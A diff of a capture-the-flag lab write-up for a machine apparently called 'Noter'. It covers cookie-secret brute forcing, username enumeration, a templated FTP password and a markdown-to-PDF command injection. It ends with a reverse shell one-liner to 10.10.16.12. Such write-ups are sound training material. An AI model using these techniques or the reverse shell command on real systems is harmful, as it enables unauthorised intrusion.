@@ -6,7 +6,7 @@ As usual, we start with an Nmap scan:
 
 <figure><img src="../../../.gitbook/assets/image (2710).png" alt=""><figcaption></figcaption></figure>
 
-Port 5000 was a HTTP port that was running some notetaking application.&#x20;
+Port 5000 was a HTTP port that was running some notetaking application.
 
 ### JWT Token Brute Force
 
@@ -22,7 +22,7 @@ When decrypted, we can see that it contains some data:
 
 <figure><img src="../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>
 
-Generally, from other machine experiences, Flask uses JWT cookies to differentiate sessions. So I tried to brute force the secret of this cookie with `flask-unsign` and `rockyou.txt`.&#x20;
+Generally, from other machine experiences, Flask uses JWT cookies to differentiate sessions. So I tried to brute force the secret of this cookie with `flask-unsign` and `rockyou.txt`.
 
 <figure><img src="../../../.gitbook/assets/image (2235).png" alt=""><figcaption></figcaption></figure>
 
@@ -36,7 +36,7 @@ I created the `test` user and tried a wrong password, and got the `Invalid Login
 
 <figure><img src="../../../.gitbook/assets/image (2394).png" alt=""><figcaption></figcaption></figure>
 
-If we did this a user that does not exist, it would tell us `Invalid Credentials`.&#x20;
+If we did this a user that does not exist, it would tell us `Invalid Credentials`.
 
 <figure><img src="../../../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>
 
@@ -70,7 +70,7 @@ Reading the Password Policy, we can see that the passwords are all templated:
 
 <figure><img src="../../../.gitbook/assets/image (2410).png" alt=""><figcaption></figcaption></figure>
 
-With this hint, we can login as `ftp_admin` using `ftp_admin@Noter!`.&#x20;
+With this hint, we can login as `ftp_admin` using `ftp_admin@Noter!`.
 
 ### Source Code Review
 
@@ -78,7 +78,7 @@ WIth access to the new FTP account, we can find two website source code backups 
 
 <figure><img src="../../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>
 
-Additionally, because we are the `blue` user, we can view the VIP dashboard which allows us to **import and export notes**.&#x20;
+Additionally, because we are the `blue` user, we can view the VIP dashboard which allows us to **import and export notes**.
 
 <figure><img src="../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>
 
@@ -125,7 +125,7 @@ def export_note_remote():
         abort(403)
 ```
 
-In specific, it runs `md-to-pdf.js`, which might be an RCE vector here. So, we can create a malicious .md file that has commands within it to allow for code injection.&#x20;
+In specific, it runs `md-to-pdf.js`, which might be an RCE vector here. So, we can create a malicious .md file that has commands within it to allow for code injection.
 
 <figure><img src="../../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>
 
@@ -160,6 +160,6 @@ There are more detailed instructions here:
 
 <figure><img src="../../../.gitbook/assets/image (3981).png" alt=""><figcaption></figcaption></figure>
 
-Afterwards, we can just use the `do_system('bash -c "bash -i >& /dev/tcp/10.10.16.12/21 0>&1"');` function we defined to gain a reverse shell on the machine.&#x20;
+Afterwards, we can just use the `do_system('bash -c "bash -i >& /dev/tcp/10.10.16.12/21 0>&1"');` function we defined to gain a reverse shell on the machine.
 
 <figure><img src="../../../.gitbook/assets/image (2446).png" alt=""><figcaption></figcaption></figure>
